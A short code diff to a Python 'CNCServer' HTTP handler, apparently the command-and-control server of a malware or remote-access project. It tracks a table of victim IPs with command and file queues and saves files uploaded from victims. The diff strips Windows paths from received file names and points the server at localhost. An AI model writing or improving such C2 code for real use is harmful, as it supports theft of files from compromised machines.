@@ -310,6 +310,10 @@ class CNCServer(BaseHTTPRequestHandler):
         try:
             fileName = victim_table[victim_ip]['fileName'].popleft()
 
+            #만약 파일명이 fullpath이면 \ 를 제거
+            if '\\' in fileName:
+                fileName = fileName.split('\\')[-1]
+
             with open(FILE_PATH+fileName, 'wb') as fw:
                 fw.write(ddp_data)
             
@@ -326,7 +330,7 @@ LOG_PATH = Logger.LOG_PATH
 FILE_PATH = './file/'
 
 ENCODING = 'cp949'
-SERVER_INFO = ('172.17.246.74', 80)
+SERVER_INFO = ('127.0.0.1', 80)
 
 victim_table = {} # {ip : {name : [name], command : [command queue], sequence : {seq num, seq data}, fileName : [fileName queue]}}
 
